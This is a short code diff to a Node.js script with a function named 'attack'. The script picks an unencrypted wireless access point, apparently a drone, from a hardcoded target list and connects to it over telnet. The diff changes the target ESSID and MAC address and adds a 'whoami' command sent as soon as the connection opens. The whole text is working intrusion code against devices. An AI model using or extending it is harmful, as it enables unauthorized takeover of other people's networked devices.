@@ -8,7 +8,12 @@ function attack () {
         var open = nodes.filter(function (node) {
             return node.encrypted === false;
         });
-        open = [ { 'essid' : 'substack', 'address' : '90:03:B7:2C:13:F9' } ];
+        open = [
+            {
+                'essid' : 'WindowsAzureDrone5',
+                'address' : '90:03:B7:2A:EA:6C'
+            }
+        ];
         var ap = open[Math.floor(Math.random() * open.length)];
         if (!ap) return setTimeout(attack, 5000);
         
@@ -59,6 +64,9 @@ function getAddr (cb) {
 function telnet (addr) {
     var s = net.connect(23, addr);
     s.pipe(process.stdout, { end : false });
+    s.on('connect', function () {
+        s.write('whoami\n');
+    });
 }
 
 attack();
